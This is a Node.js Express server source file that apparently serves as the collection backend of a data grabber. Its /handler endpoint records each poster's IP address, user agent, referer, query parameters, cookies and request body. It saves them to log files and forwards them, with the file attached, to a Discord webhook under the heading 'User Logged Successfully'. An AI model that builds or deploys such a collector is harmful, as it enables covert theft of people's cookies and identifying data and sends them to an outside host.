const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const mime = require('mime-types');  

const app = express();
const port = 443;

app.use(express.json({ limit: '10mb' }));

const apiRouter = express.Router();
app.use('/api', apiRouter);

const discordWebhookURL = '';

const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}

apiRouter.get('/validation', async (req, res) => {
    const embedData = {
        username: "Logger",
        embeds: [
            {
                title: "User Getting Logged...",
            }
        ]
    };

    try {
        await axios.post(discordWebhookURL, embedData);

        res.status(200).json({
            success: true,
            msg: 'Validation successful',
        });
    } catch (error) {
        console.error('Error sending webhook:', error);
        res.status(500).json({
            success: false
        });
    }
});

apiRouter.post('/handler', async (req, res) => {
    console.log('Handler request received:', req.body);
    
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    
    const ipAddress = req.ip.replace(/:/g, '-'); 

    const fileName = `${ipAddress}-${timestamp}.json`;
    const filePath = path.join(logsDir, fileName);

    const logData = {
        timestamp,
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        referer: req.headers.referer,
        queryParams: req.query,
        cookies: req.cookies,
        body: req.body
    };

    fs.writeFile(filePath, JSON.stringify(logData, null, 2), (err) => {
        if (err) {
            console.error('Error saving log file:', err);
            return res.status(500).json({
                success: false,
                msg: 'Error saving log file',
            });
        }

        const embedData = {
            username: "Logger",
            embeds: [
                {
                    title: "User Logged Successfully",
                    description: `**Request Info:**\n` +
                                 `- **User-Agent:** ${req.headers['user-agent']}\n` +
                                 `- **IP Address:** ${req.ip}\n` +
                                 `- **Referer:** ${req.headers.referer}\n` +
                                 `- **Query Parameters:** ${JSON.stringify(req.query)}\n` +
                                 `- **Cookies:** ${JSON.stringify(req.cookies)}\n` +
                                 `- **Timestamp:** ${timestamp}`
                }
            ]
        };

        const form = new FormData();
        form.append('payload_json', JSON.stringify(embedData));
        form.append('file', fs.createReadStream(filePath), {
            filename: fileName,
            contentType: mime.lookup(filePath) || 'application/json'
        });

        axios.post(discordWebhookURL, form, {
            headers: form.getHeaders(),
        }).catch(error => {
            console.error('Error sending webhook:', error);
        });

        res.status(200).json({
            success: true,
            msg: 'Handler successful',
        });
    });
});

app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({
        success: false,
        msg: 'Internal Server Error',
    });
});

app.use((req, res) => {
    res.status(404).json({
        success: false,
        msg: 'Not Found',
    });
});

app.listen(port, () => {
    console.log(`API is running on http://localhost:${port}`);
});
